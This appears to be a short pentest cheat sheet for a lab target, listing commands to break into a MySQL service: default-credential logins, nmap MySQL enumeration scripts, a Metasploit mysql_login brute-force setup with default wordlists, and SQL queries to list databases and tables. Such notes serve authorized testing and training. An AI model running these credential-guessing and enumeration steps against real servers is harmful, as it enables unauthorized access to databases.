## Initial Connection & Enumeration
```sh
# Default credentials attempt
mysql -h 10.10.115.13 -u root -p
mysql -h 10.10.115.13 -u root
mysql -h 10.10.115.13

# Common username/password combinations
mysql -h 10.10.115.13 -u root -p password
mysql -h 10.10.115.13 -u root -p root
mysql -h 10.10.115.13 -u admin -p admin

# Basic MySQL detection
nmap -p 3306 10.10.115.13 --script mysql-info

# Comprehensive MySQL scan
nmap -p 3306 10.10.115.13 --script mysql-*

# MySQL enumeration
nmap -p 3306 10.10.115.13 --script mysql-databases,mysql-users,mysql-variables


msfconsole
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 10.10.115.13
set USER_FILE /usr/share/wordlists/metasploit/mysql_default_user.txt
set PASS_FILE /usr/share/wordlists/metasploit/mysql_default_pass.txt
run
```

```
show databases;

show tables; 

SHOW COLUMNS FROM table_name;  or DESC table_name;
```